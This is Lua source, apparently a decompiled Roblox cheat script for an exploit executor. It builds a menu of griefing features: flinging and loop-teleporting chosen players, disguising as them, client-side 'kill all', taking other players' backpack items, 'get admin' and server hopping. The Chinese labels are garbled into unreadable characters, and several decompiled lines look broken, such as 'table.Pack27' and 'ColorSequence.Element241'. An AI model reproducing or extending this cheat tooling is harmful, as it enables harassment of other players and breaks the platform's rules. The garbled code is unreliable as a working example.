Element421.Title = "å å¥æå°äººæå¡å¨"
Element421.Desc = "ä¼ éå°å½åæ¸¸æäººæ°æå°çæå¡å¨"
Element421.Icon = "users"
Element147 = Job169
Element421.Callback = Job169
Rose = Aqua
Aqua = Aqua.Button
Aqua(Rose, Element421)
Aqua = Element241.informationTab
local Element422 = {}
Players = Element422
Element422.Title = "å å¥æå¤äººæå¡å¨"
Element422.Desc = "ä¼ éå°å½åæ¸¸æäººæ°æå¤çæå¡å¨"
Element422.Icon = "users"
Element147 = Job170
Element422.Callback = Job170
Rose = Aqua
Aqua = Aqua.Button
Aqua(Rose, Element422)
Aqua = Element241.informationTab
local Element423 = {}
Players = Element423
Element423.Title = "éæ°å å¥æå¡å¨"
Element423.Desc = "éæ°å å¥å½åæå¨çæå¡å¨"
Element423.Icon = "refresh-cw"
Element147 = Job171
Element423.Callback = Job171
Rose = Aqua
Aqua = Aqua.Button
Aqua(Rose, Element423)
Aqua = Element241.informationTab
local Element424 = {}
Players = Element424
Element424.Title = "èæ¬æ¯å¶ä½"
Element147 = Job172
Element424.Callback = Job172
Rose = Aqua
Aqua = Aqua.Button
Aqua(Rose, Element424)
Aqua = Element241.informationTab
local Element425 = {}
Players = Element425
Element425.Title = "æ³¨å¥å¨"
Element147 = identifyexecutor and identifyexecutor(select(5, ...)) or "æªç¥"
Players.Desc = Element147
Players.Image = "rbxassetid://71024334944141"
Players.ImageSize = 50
Players.Thumbnail = "rbxassetid://907386"
Players.ThumbnailSize = 100
local Element426 = {}
LocalPlayer16 = Element426
Element147 = Element426
Players.Buttons = Element426
Rose = Aqua
Aqua = Aqua.Paragraph
Aqua(Rose, Players)
Aqua = Element241.informationTab
local Element427 = {}
Players = Element427
Element427.Title = "ç¨æ·å"
Element148 = game
Players = game.Players
LocalPlayer16 = Players.LocalPlayer
Element427.Desc = LocalPlayer16.Name
Element427.Image = "rbxassetid://71024334944141"
Element427.ImageSize = 50
Element427.Thumbnail = "rbxassetid://907386800262"
Element427.ThumbnailSize = 100
local Element428 = {}
LocalPlayer16 = Element428
Element147 = Element428
Element427.Buttons = Element428
Rose = Aqua
Aqua = Aqua.Paragraph
Aqua(Rose, Element427)
Players = "Players"
Rose = Element148
Aqua = Element148:GetService("Players")
Rose = Aqua.LocalPlayer
Players = nil
Element147 = Instance11
LocalPlayer16 = Job173
Players = Instance13
Element148 = checkCondition2
Element149 = findChild2
Element156 = getPlayers4
Element157 = nil
DisguiseTab = Element241.DisguiseTab
local Element429 = {}
Players = Element429
Element429.Title = "éæ©ç®æ ç©å®¶"
Players.Values = getPlayers4(select(16, ...))
Players.Value = nil
Players.Multi = false
Players.AllowNone = true
Runservice5 = Job174
Players.Callback = Job174
RunService = DisguiseTab
Element157 = DisguiseTab.Dropdown(RunService, Players)
DisguiseTab = Element241.DisguiseTab
local Element430 = {}
Players = Element430
Element430.Title = "å·æ°ç©å®¶åè¡¨"
Runservice5 = Job175
Element430.Callback = Job175
RunService = DisguiseTab
DisguiseTab = DisguiseTab.Button
DisguiseTab(RunService, Element430)
DisguiseTab = Element241.DisguiseTab
local Element431 = {}
Players = Element431
Element431.Title = "ä¼ªè£ç©å®¶ï¼åªå¨r6æå¡å¨æå¯ä»¥ï¼"
Runservice5 = Job176
Element431.Callback = Job176
RunService = DisguiseTab
DisguiseTab = DisguiseTab.Button
DisguiseTab(RunService, Element431)
DisguiseTab = Element241.DisguiseTab
local Element432 = {}
Players = Element432
Element432.Title = "è¿åèªå·±çå¤è§"
Runservice5 = Job177
Element432.Callback = Job177
RunService = DisguiseTab
DisguiseTab = DisguiseTab.Button
DisguiseTab(RunService, Element432)
Players = "Players"
RunService = game
DisguiseTab = game:GetService("Players")
Runservice5 = "RunService"
Players = game
RunService = game:GetService("RunService")
Startergui2 = "StarterGui"
Runservice5 = game
Players = game:GetService("StarterGui")
Runservice5 = DisguiseTab.LocalPlayer
Workspace = "Workspace"
Element176 = game
Startergui2 = game:GetService("Workspace")
Element176 = {
dropdown = {},
playernamedied = nil,
LoopTeleport = false,
}
Workspace = ""
Element194 = 3
Element196 = 4
Element163 = runProtected5
Element177 = getPlayers5
Element181 = getService
Element178 = Element241.flingTab
local Element433 = {}
Connection = Element433
Element433.Title = "éæ©ç©å®¶çåç§°"
Element433.Desc = "éæ©ç®æ ç©å®¶"
Connection.Values = getPlayers5(select(17, ...))
Connection.Value = nil
Connection.AllowNone = true
Element192 = Job180
Connection.Callback = Job180
Button = Element178
Element178 = Element178.Dropdown(Button, Connection)
Button = Element241.flingTab
local Element434 = {}
Element192 = Element434
Element434.Title = "å·æ°ç©å®¶åç§°"
Element193 = Job181
Element434.Callback = Job181
Connection = Button
Button = Button.Button
Button(Connection, Element434)
Button = Element241.flingTab
local Element435 = {}
Element192 = Element435
Element435.Title = "ä¼ éå°ç©å®¶æè¾¹"
Element193 = Job182
Element435.Callback = Job182
Connection = Button
Button = Button.Button
Button(Connection, Element435)
Button = Element241.flingTab
local Element436 = {}
Element192 = Element436
Element436.Title = "éå®ä¼ é"
Element436.Desc = "æç»­ä¼ éå°ç©å®¶æè¾¹"
Element436.Value = false
Element193 = Job183
Element436.Callback = Job183
Connection = Button
Button = Button.Toggle
Button(Connection, Element436)
Button = Element241.flingTab
local Element437 = {}
Element192 = Element437
Element437.Title = "æç©å®¶ä¼ éè¿æ¥"
Element193 = Job185
Element437.Callback = Job185
Connection = Button
Button = Button.Button
Button(Connection, Element437)
Button = Element241.flingTab
local Element438 = {}
Element192 = Element438
Element438.Title = "å¾ªç¯ä¼ éç©å®¶è¿æ¥"
Element438.Value = false
Element193 = Job186
Element438.Callback = Job186
Connection = Button
Button = Button.Toggle
Button(Connection, Element438)
Button = Element241.flingTab
local Element439 = {}
Element192 = Element439
Element439.Title = "æ¥çç©å®¶"
Element439.Value = false
Element193 = Job188
Element439.Callback = Job188
Connection = Button
Button = Button.Toggle
Button(Connection, Element439)
Button = Element241.flingTab
local Element440 = {}
Element192 = Element440
Element440.Title = "ç©é£ä¸æ¬¡"
Element193 = Job189
Element440.Callback = Job189
Connection = Button
Button = Button.Button
Button(Connection, Element440)
Button = Element241.flingTab
local Element441 = {}
Element192 = Element441
Element441.Title = "å¾ªç¯ç©é£"
Element441.Value = false
Element193 = Job190
Element441.Callback = Job190
Connection = Button
Button = Button.Toggle
Button(Connection, Element441)
Button = Element241.flingTab
local Element442 = {}
Element192 = Element442
Element442.Title = "ç©é£ææäºº"
Element193 = Job192
Element442.Callback = Job192
Connection = Button
Button = Button.Button
Button(Connection, Element442)
Button = Element241.flingTab
local Element443 = {}
Element192 = Element443
Element443.Title = "å¼å¯æå®èªçç®æ "
Element443.Value = false
Element193 = Job193
Element443.Callback = Job193
Connection = Button
Button = Button.Toggle
Button(Connection, Element443)
Button = {}
Connection = nil
Element192 = getPlayers6
Element193 = getPlayers6
getPlayers6(select(5, ...))
Element193 = Element241.flingTab
local Element444 = {}
Players = Element444
Element444.Title = "éæ©ç©å®¶"
Element444.Desc = "éæ©ç®æ ç©å®¶"
Element444.Values = Button
Element444.Value = nil
Element444.AllowNone = true
Players = Job195
Element444.Callback = Job195
Element193 = Element193:Dropdown(Element444)
local flingTab = Element241.flingTab
local Element445 = {}
Players = Element445
Element445.Title = "å·æ°ç©å®¶åç§°"
Element219 = Job196
Element445.Callback = Job196
Players = flingTab
flingTab.Button(Players, Element445)
flingTab = Element241.flingTab
local Element446 = {}
Players = Element446
Element446.Title = "ä¼ éè³ç©å®¶åæ¹è·ç¦»"
local Element447 = {}
Element210 = Element447
Element447.Min = 3
Element447.Max = 25
Element211 = 3
Element447.Default = 3
Element446.Value = Element447
Element446.Step = 1
Element219 = Job197
Element446.Callback = Job197
Players = flingTab
flingTab.Slider(Players, Element446)
flingTab = Element241.flingTab
local Element448 = {}
Players = Element448
Element448.Title = "å¾ªç¯ä¼ éè³ç©å®¶åæ¹"
Element448.Value = false
Element219 = Job198
Element448.Callback = Job198
Players = flingTab
flingTab.Toggle(Players, Element448)
flingTab = Element241.flingTab
local Element449 = {}
Players = Element449
Element449.Title = "å¾ªç¯ä¼ éè³ç©å®¶å¤´é¡¶é«åº¦"
local Element450 = {}
Element210 = Element450
Element450.Min = 4
Element450.Max = 25
Element211 = 4
Element450.Default = 4
Element449.Value = Element450
Element449.Step = 1
Element219 = Job200
Element449.Callback = Job200
Players = flingTab
flingTab.Slider(Players, Element449)
flingTab = Element241.flingTab
local Element451 = {}
Players = Element451
Element451.Title = "å¾ªç¯ä¼ éè³ç©å®¶å¤´é¡¶"
Element451.Value = false
Element219 = Job201
Element451.Callback = Job201
Players = flingTab
flingTab.Toggle(Players, Element451)
flingTab = Element241.flingTab
local Element452 = {}
Players = Element452
Element452.Title = "å¾ªç¯ä¼ éè³ç©å®¶åé¢çè·ç¦»"
local Element453 = {}
Element210 = Element453
Element453.Min = 4
Element453.Max = 30
Element211 = 4
Element453.Default = 4
Element452.Value = Element453
Element452.Step = 1
Element219 = Job203
Element452.Callback = Job203
Players = flingTab
flingTab.Slider(Players, Element452)
flingTab = Element241.flingTab
local Element454 = {}
Players = Element454
Element454.Title = "å¾ªç¯ä¼ éè³ç©å®¶åé¢"
Element454.Value = false
Element219 = Job204
Element454.Callback = Job204
Players = flingTab
flingTab.Toggle(Players, Element454)
flingTab = Element241.flingTab
local Element455 = {}
Players = Element455
Element455.Title = "ç¯ç»åå¾"
Element455.Desc = "ç¯ç»è·ç¦»"
local Element456 = {}
Element210 = Element456
Element456.Min = 1
Element456.Max = 60
Element211 = 10
Element456.Default = 10
Element455.Value = Element456
Element219 = Job206
Element455.Callback = Job206
Players = flingTab
flingTab.Slider(Players, Element455)
flingTab = Element241.flingTab
local Element457 = {}
Players = Element457
Element457.Title = "ç¯ç»éåº¦"
Element457.Desc = "ç¯ç»éåº¦"
local Element458 = {}
Element210 = Element458
Element458.Min = 1
Element458.Max = 120
Element211 = 5
Element458.Default = 5
Element457.Value = Element458
Element219 = Job207
Element457.Callback = Job207
Players = flingTab
flingTab.Slider(Players, Element457)
flingTab = Element241.flingTab
local Element459 = {}
Players = Element459
Element459.Title = "ç¯ç»é«åº¦"
Element459.Desc = "ç¯ç»é«åº¦"
local Element460 = {}
Element210 = Element460
Element460.Min =-20
Element460.Max = 25
Element211 = 0
Element460.Default = 0
Element459.Value = Element460
Element219 = Job208
Element459.Callback = Job208
Players = flingTab
flingTab.Slider(Players, Element459)
flingTab = Element241.flingTab
local Element461 = {}
Players = Element461
Element461.Title = "ç¯ç»ç©å®¶"
Element461.Desc = "å¼å¯ç¯ç»"
Element461.Value = false
Element219 = Job209
Element461.Callback = Job209
Players = flingTab
flingTab.Toggle(Players, Element461)
Players = "Players"
Players = game
Players = game:GetService("Players").LocalPlayer
Players = runProtected6
Element219 = false
Element210 = nil
Element218 = {}
Element220 = 0
Element221 = 100
Element222 = 255
Element218["èè²"] = Color3.fromRGB(0, 100, 255)
Element220 = 0
Element221 = 255
Element222 = 100
Element218["ç»¿è²"] = Color3.fromRGB(0, 255, 100)
Element220 = 255
Element221 = 0
Element222 = 0
Element218["çº¢è²"] = Color3.fromRGB(255, 0, 0)
Element220 = 0
Element221 = 255
Element222 = 255
Element218["éè²"] = Color3.fromRGB(0, 255, 255)
Element220 = 255
Element221 = 255
Element222 = 0
Element218["é»è²"] = Color3.fromRGB(255, 255, 0)
Element220 = 255
Element221 = 150
Element222 = 0
Element218["æ©è²"] = Color3.fromRGB(255, 150, 0)
Element220 = 150
Element221 = 0
Element222 = 255
Element218["ç´«è²"] = Color3.fromRGB(150, 0, 255)
Element220 = 255
Element221 = 105
Element222 = 180
Element218["ç²è²"] = Color3.fromRGB(255, 105, 180)
Element220 = 0
Element221 = 0
Element222 = 0
Element218["é»è²"] = Color3.fromRGB(0, 0, 0)
Element220 = 255
Element221 = 255
Element222 = 255
Element218["ç½è²"] = Color3.fromRGB(255, 255, 255)
Element218["å½©è¹"] = "rainbow"
Element211 = Element218
Element218 = "éè²"
Element212 = ColorSequence.Element241
Element220 = {}
Element221 = ColorSequenceKeypoint.Element241
Element222 = 0
Character31 = Color3.fromRGB(255, 0, 0)
Element221 = Element221(0, Character31)
Character31 = 0.17
Element222 = ColorSequenceKeypoint.Element241(0.17, Color3.fromRGB(255, 165, 0))
Character31 = ColorSequenceKeypoint.Element241(0.33, Color3.fromRGB(255, 255, 0))
Unpacked46 = 0
local colorSequenceKeypoint = ColorSequenceKeypoint.Element241(0.5, Color3.fromRGB(0, 255, 0))
Unpacked46 = 100
local Key2 = ColorSequenceKeypoint.Element241(0.67, Color3.fromRGB(0, 100, 255))
Unpacked46 = 75
local Key3 = ColorSequenceKeypoint.Element241(0.83, Color3.fromRGB(75, 0, 130))
local Element462 = ColorSequenceKeypoint.Element241
Unpacked46 = Color3.fromRGB(238, 130, 238)
Element462 = Element462(1, Unpacked46)
Element220[1] = Element221
Element220[2] = Element222
Element220[3] = Character31
Element220[4] = colorSequenceKeypoint
Element220[5] = Key2
Element220[6] = Key3
Element220[7] = Element462
Element212 = Element212(Element220)
Element220 = processItems9
Element221 = processItems10
Element222 = updateState2
Character31 = Players.CharacterAdded
colorSequenceKeypoint = Character31
Character31 = Character31.Connect
Character31(colorSequenceKeypoint, Job212)
Character31 = Element241.ActionTab
colorSequenceKeypoint = Character31
Character31 = Character31.Toggle
Character31(colorSequenceKeypoint, {
Title = "å¯ç¨å°¾è¿¹",
Desc = "ç»ç©å®¶æ·»å å½©è²å°¾è¿¹",
Value = false,
Callback = callback9,
})
Character31 = Element241.ActionTab
local Element463 = {Title = "å°¾è¿¹é¢è²", Desc = "éæ©å°¾è¿¹çé¢è²"}
Unpacked46 = "ç»¿è²"
Element463.Values = {
[1] = "èè²",
[2] = "ç»¿è²",
[3] = "çº¢è²",
[4] = "éè²",
[5] = "é»è²",
[6] = "æ©è²",
[7] = "å½©è¹",
[8] = "é»è²",
[9] = "ç½è²",
[10] = "ç´«è²",
[11] = "ç²è²",
}
Element463.Value = "éè²"
Element463.Callback = Job213
colorSequenceKeypoint = Character31
Character31 = Character31.Dropdown
Character31(colorSequenceKeypoint, Element463)
Character31 = runProtected7
local Element464 = {Name = "å¸è¡é¬¼"}
Element464.data = {
Element223 = "rbxassetid://1083445855",
idle2 = "rbxassetid://1083450166",
walk = "rbxassetid://1083473930",
run = "rbxassetid://1083462077",
jump = "rbxassetid://1083455352",
climb = "rbxassetid://1083439238",
fall = "rbxassetid://1083443587",
}
local Element465 = {Name = "è±é"}
Element465.data = {
Element223 = "rbxassetid://616111295",
idle2 = "rbxassetid://616113536",
walk = "rbxassetid://616122287",
run = "rbxassetid://616117076",
jump = "rbxassetid://616115533",
climb = "rbxassetid://616104706",
fall = "rbxassetid://616108001",
}
local Element466 = {Name = "ç»å¸åµå°¸"}
Element466.data = {
Element223 = "rbxassetid://616158929",
idle2 = "rbxassetid://616160636",
walk = "rbxassetid://616168032",
run = "rbxassetid://616163682",
jump = "rbxassetid://616161997",
climb = "rbxassetid://616156119",
fall = "rbxassetid://616157476",
}
local Element467 = {Name = "æ³å¸"}
Element467.data = {
Element223 = "rbxassetid://707742142",
idle2 = "rbxassetid://707855907",
walk = "rbxassetid://707897309",
run = "rbxassetid://707861613",
jump = "rbxassetid://707853694",
climb = "rbxassetid://707826056",
fall = "rbxassetid://707829716",
}
Unpacked46 = Element467
local Element468 = {Name = "å¹½çµ"}
Element468.data = {
Element223 = "rbxassetid://616006778",
idle2 = "rbxassetid://616008087",
walk = "rbxassetid://616010382",
run = "rbxassetid://616013216",
jump = "rbxassetid://616008936",
climb = "rbxassetid://616003713",
fall = "rbxassetid://616005863",
}
local Element469 = {Name = "é¿è"}
Element469.data = {
Element223 = "rbxassetid://845397899",
idle2 = "rbxassetid://845400520",
walk = "rbxassetid://845403856",
run = "rbxassetid://845386501",
jump = "rbxassetid://845398858",
climb = "rbxassetid://845392038",
fall = "rbxassetid://845396048",
}
local Element470 = {Name = "æ¬æµ®"}
Element470.data = {
Element223 = "rbxassetid://616006778",
idle2 = "rbxassetid://616008087",
walk = "rbxassetid://616013216",
run = "rbxassetid://616010382",
jump = "rbxassetid://616008936",
climb = "rbxassetid://616003713",
fall = "rbxassetid://616005863",
}
local Element471 = {Name = "å®èªå"}
Element471.data = {
Element223 = "rbxassetid://891621366",
idle2 = "rbxassetid://891633237",
walk = "rbxassetid://891667138",
run = "rbxassetid://891636393",
jump = "rbxassetid://891627522",
climb = "rbxassetid://891609353",
fall = "rbxassetid://891617961",
}
local Element472 = {Name = "å¿è"}
Element472.data = {
Element223 = "rbxassetid://656117400",
idle2 = "rbxassetid://656118341",
walk = "rbxassetid://656121766",
run = "rbxassetid://656118852",
jump = "rbxassetid://656117878",
climb = "rbxassetid://656114359",
fall = "rbxassetid://656115606",
}
local Element473 = {Name = "ç¼äºº"}
Element473.data = {
Element223 = "rbxassetid://1083195517",
idle2 = "rbxassetid://1083214717",
walk = "rbxassetid://1083178339",
run = "rbxassetid://1083216690",
jump = "rbxassetid://1083218792",
climb = "rbxassetid://1083182000",
fall = "rbxassetid://1083189019",
}
local Element474 = {Name = "å¡é"}
Element474.data = {
Element223 = "rbxassetid://742637544",
idle2 = "rbxassetid://742638445",
walk = "rbxassetid://742640026",
run = "rbxassetid://742638842",
jump = "rbxassetid://742637942",
climb = "rbxassetid://742636889",
fall = "rbxassetid://742637151",
}
local Element475 = {Name = "æµ·ç"}
Element475.data = {
Element223 = "rbxassetid://750781874",
idle2 = "rbxassetid://750782770",
walk = "rbxassetid://750785693",
run = "rbxassetid://750783738",
jump = "rbxassetid://750782230",
climb = "rbxassetid://750779899",
fall = "rbxassetid://750780242",
}
local Element476 = {Name = "æ½è¡"}
Element476.data = {
Element223 = "rbxassetid://1132473842",
idle2 = "rbxassetid://1132477671",
walk = "rbxassetid://1132510133",
run = "rbxassetid://1132494274",
jump = "rbxassetid://1132489853",
climb = "rbxassetid://1132461372",
fall = "rbxassetid://1132469004",
}
local Element477 = {Name = "ç©å·"}
Element477.data = {
Element223 = "rbxassetid://782841498",
idle2 = "rbxassetid://782845736",
walk = "rbxassetid://782843345",
run = "rbxassetid://782842708",
jump = "rbxassetid://782847020",
climb = "rbxassetid://782843869",
fall = "rbxassetid://782846423",
}
local Element478 = {Name = "éªå£«"}
Element478.data = {
Element223 = "rbxassetid://657595757",
idle2 = "rbxassetid://657568135",
walk = "rbxassetid://657552124",
run = "rbxassetid://657564596",
jump = "rbxassetid://658409194",
climb = "rbxassetid://658360781",
fall = "rbxassetid://657600338",
}
local Element479 = {Name = "èªä¿¡"}
Element479.data = {
Element223 = "rbxassetid://1069977950",
idle2 = "rbxassetid://1069987858",
walk = "rbxassetid://1070017263",
run = "rbxassetid://1070001516",
jump = "rbxassetid://1069984524",
climb = "rbxassetid://1069946257",
fall = "rbxassetid://1069973677",
}
local Element480 = {
[1] = Element464,
[2] = Element465,
[3] = Element466,
[4] = Unpacked46,
[5] = Element468,
[6] = Element469,
[7] = Element470,
[8] = Element471,
[9] = Element472,
[10] = Element473,
[11] = Element474,
[12] = Element475,
[13] = Element476,
[14] = Element477,
[15] = Element478,
[16] = Element479,
}
local Element481 = {Name = "æµè¡ææ"}
Element481.data = {
Element223 = "rbxassetid://1212900985",
idle2 = "rbxassetid://1212900985",
walk = "rbxassetid://1212980338",
run = "rbxassetid://1212980348",
jump = "rbxassetid://1212954642",
climb = "rbxassetid://1213044953",
fall = "rbxassetid://1212900995",
}
local Element482 = {Name = "å¬ä¸»"}
Element482.data = {
Element223 = "rbxassetid://941003647",
idle2 = "rbxassetid://941013098",
walk = "rbxassetid://941028902",
run = "rbxassetid://941015281",
jump = "rbxassetid://941008832",
climb = "rbxassetid://940996062",
fall = "rbxassetid://941000007",
}
local Element483 = {Name = "çä»"}
Element483.data = {
Element223 = "rbxassetid://1014390418",
idle2 = "rbxassetid://1014398616",
walk = "rbxassetid://1014421541",
run = "rbxassetid://1014401683",
jump = "rbxassetid://1014394726",
climb = "rbxassetid://1014380606",
fall = "rbxassetid://1014384571",
}
local Element484 = {Name = "å·¡é»"}
Element484.data = {
Element223 = "rbxassetid://1149612882",
idle2 = "rbxassetid://1150842221",
walk = "rbxassetid://1151231493",
run = "rbxassetid://1150967949",
jump = "rbxassetid://1150944216",
climb = "rbxassetid://1148811837",
fall = "rbxassetid://1148863382",
}
Unpacked46 = Element484
Element480[17] = Element481
Element480[18] = Element482
Element480[19] = Element483
Element480[20] = Element484
Key2 = ipairs(Element480)
Key3 = Element480
local Pack27 = table.Pack27(Key2(Key3, 0))
local Unpacked49 = table.unpack(Pack27, 1, Pack27.Element204)
local ActionTab, Element485
if not (Unpacked49 == nil) then
    Element462 = Unpacked49
    local Element486 = {}
    while true do
        ActionTab = Element241.ActionTab
        Element485 = Element486
        Element485.Title = Pack27[2].Name
        Unpacked46 = table.unpack(Pack27, 2, Pack27.Element204)
        Element485.Desc = "ç¹å»åºç¨ " .. Unpacked46.Name .. " å¨ç»å"
        Element485.Icon = "play"
        Element485.Callback = Job215
        ActionTab:Button(Element485)
        Pack27 = table.Pack27(Key2(Key3, Element462))
        Unpacked49 = table.unpack(Pack27, 1, Pack27.Element204)
        if Unpacked49 ~= nil then
            Element462 = Unpacked49
            continue
        end
        break
    end
end

Element241.yiTab:Toggle({
Title = "æ æ³ç§»å¨",
Desc = "äººç©å°ç§»å¨ä¸äº",
Value = false,
Callback = callback10,
})
Element241.yiTab:Button({
Title = "å»æææäºº",
Desc = "å®¢æ·ç«¯",
Icon = "skull",
Callback = callback11,
})
Element241.SpeedTab:Button({Title = "èªæ", Icon = "skull", Callback = callback12})
Element241.yiTab:Toggle({
Title = "è·åææç©å®¶èå",
Desc = "æ¿èµ°ç©å®¶çç©å",
Value = false,
Callback = callback13,
})
Element241.yiTab:Button({Title = "è¸ç©ºè¡èµ°", Callback = callback14})
Element241.yiTab:Button({
Title = "æ¥çæ¸¸æä¸­çææç©å®¶åæ¬è¡æ¡",
Callback = callback15,
})
Element241.yiTab:Button({Title = "å·¥å·å", Callback = callback16})
Element241.yiTab:Button({Title = "èå¤ä¼ éè³ç©å®¶èº«è¾¹", Callback = callback17})
Element241.yiTab:Button({Title = "å æéå·", Callback = callback18})
Element241.yiTab:Button({Title = "å æææéå·", Callback = callback19})
Element241.yiTab:Button({Title = "ç¬å¢", Callback = callback20})
Element241.yiTab:Button({Title = "æ¿èº«", Callback = callback21})
Element241.yiTab:Button({Title = "äººç©èºæä¸å¤©", Callback = callback22})
Element241.yiTab:Button({Title = "èå¤©æ°æ³¡", Callback = callback23})
Element241.yiTab:Button({Title = "è·åç®¡çå", Callback = callback24})
Element241.yiTab:Button({Title = "æ­»äº¡ç¬è®°", Callback = callback25})
Element241.yiTab:Button({Title = "èäºº", Callback = callback26})
Element241.yiTab:Button({Title = "è®¡ç®æº", Callback = callback27})
Element241.yiTab:Button({Title = "è§£éææååå¨ä½", Callback = callback28})
Element241.yiTab:Button({Title = "è¶è·è¶å¿«", Callback = callback29})
Element241.yiTab:Button({Title = "åæè½¦", Callback = callback30})
